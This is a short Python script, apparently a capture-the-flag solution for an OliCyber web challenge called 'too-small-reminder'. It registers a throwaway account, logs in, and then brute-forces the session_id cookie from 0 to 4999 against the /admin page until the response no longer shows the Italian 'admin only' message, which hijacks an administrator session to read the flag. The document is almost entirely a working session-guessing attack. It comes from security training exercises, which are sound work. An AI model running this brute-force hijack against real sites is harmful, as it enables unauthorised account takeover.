import requests as r
from random import randint
from tqdm import trange

url = 'http://too-small-reminder.challs.olicyber.it/'
s = r.Session()
# register
n = randint(0, 10e10)
name = "samuele" + str(n)
password = name
res = s.post(url + 'register', json={'username': name, 'password': password})
print(res.text)

# login
#username = 'admin'
res = s.post(url + 'login', json={'username': name, 'password': password})
print(s.cookies)
# set the cookie
for i in trange(5000):
    s.cookies.set('session_id', str(i))
    # get the flag
    res = r.get(url + 'admin', cookies={'session_id': str(i)})
    if '{"messaggio":"Questa area \\u00e8 riservata all\'admin!"}' !=  res.text.strip():
        print(res.text)
        break